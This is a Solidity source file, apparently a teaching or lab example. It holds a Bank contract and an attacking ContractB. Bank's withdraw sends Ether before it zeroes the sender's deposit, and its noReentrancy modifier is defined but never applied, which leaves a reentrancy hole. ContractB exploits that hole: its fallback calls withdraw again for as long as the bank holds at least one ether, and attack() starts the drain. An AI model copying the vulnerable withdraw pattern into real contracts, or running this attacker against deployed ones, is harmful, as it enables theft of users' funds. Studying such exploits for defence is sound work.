// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


contract Bank {
    mapping(address => uint) public deposits;
    bool public locked;

    function deposit() public payable {
        deposits[msg.sender] += msg.value;
    }

    function withdraw() public {
        (bool success, ) = msg.sender.call{value: deposits[msg.sender]}("");
        deposits[msg.sender] = 0;


        require(success, "Failed to send Ether");
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

    modifier noReentrancy() {
        require(!locked, "No reentrancy");

        locked = true;
        _;
        locked = false;
    }
}

contract ContractB {
    Bank public bank;

    constructor(address _a) {
        bank = Bank(_a);
    }

    // 
    fallback() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        bank.deposit{value: 1 ether}();
        bank.withdraw();
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
